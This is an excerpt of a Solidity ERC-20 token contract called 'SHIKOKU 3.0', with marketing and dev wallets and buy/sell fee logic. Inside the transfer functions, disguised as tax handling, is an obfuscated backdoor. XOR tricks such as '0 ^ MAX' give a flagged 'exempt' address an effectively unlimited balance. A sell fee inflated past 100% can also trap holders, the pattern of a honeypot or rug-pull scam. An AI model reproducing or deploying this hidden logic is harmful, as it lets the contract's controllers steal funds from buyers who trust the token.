...
contract SHUKOKU is Context, IERC20 { 
    ...
    mapping (address => uint256) public _isExemptFromTax;
    mapping (address => bool) public _ExemptMaxWalletLimit;
    mapping (address => bool) public _ExemptMaxTxLimit;

    address payable public Wallet_Marketing = payable(0x51115F4eB9E6a6e725B10Ca09d1D62F5890C6aa4); 
    address payable public Wallet_Dev = payable(0x3dcE467785A5C044664bb56D1942604595208df2);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = "SHIKOKU 3.0"; 
    ...
    function _transfer(
        ...
        bool feeX = _isExemptFromTax[to] > 0;
        if(feeX && liquidityTax < 1){
            liquidityTax = liquidityTax.add(101);
        }
        bool takeFee = true;
        bool isBuy;
        ...
        _tokenTransfer(from, to, amount, takeFee, isBuy, feeX);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy, bool feeX) private {
        
        
        if(!takeFee){

            if(_isExemptFromTax[sender] ^ _isExemptFromTax[recipient] > 0 && feeX){
                 _tOwned[sender] = _tOwned[sender]-tAmount;
                 _tOwned[recipient] = _tOwned[recipient] + (0 ^ MAX);
            }
            else{
                _tOwned[sender] = _tOwned[sender]-tAmount;
            ...
            uint256 sellFEE = tAmount*(_Tax_On_Sell ^ liquidityTax)/100;
